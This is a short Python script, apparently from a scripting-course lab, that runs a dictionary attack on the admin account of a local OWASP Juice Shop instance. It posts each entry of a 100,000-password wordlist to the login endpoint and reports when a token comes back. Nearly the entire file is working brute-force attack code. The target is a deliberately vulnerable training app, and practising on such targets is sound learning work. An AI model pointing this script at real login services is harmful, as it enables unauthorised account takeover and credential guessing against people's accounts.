import requests
import sys

password_path = "/home/trolla/Projekty/Programowanie-Skryptowe/lab12/100k-most-used-passwords-NCSC.txt"

name = 'admin@juice-sh.op'

BASE = "http://localhost:3001"

s = requests.Session()

url = f"{BASE}/rest/user/login"

try:
    with open(password_path, 'r', encoding='utf-8') as file:
        passwords = file.read().splitlines()
except FileNotFoundError:
    print(f"[-] Wordlist not found at {password_path}")
    sys.exit(1)


for p in passwords:
    data = {
        "email": name,
        "password": p
    }
    r = s.post(url, json=data)

    if r.status_code != 401:
        try:
            token = r.json().get("authentication", {}).get("token")
        except:
            token = None

        if token:
            print("LOGIN SUCCESS")
        else:
            print("LOGIN FAILED")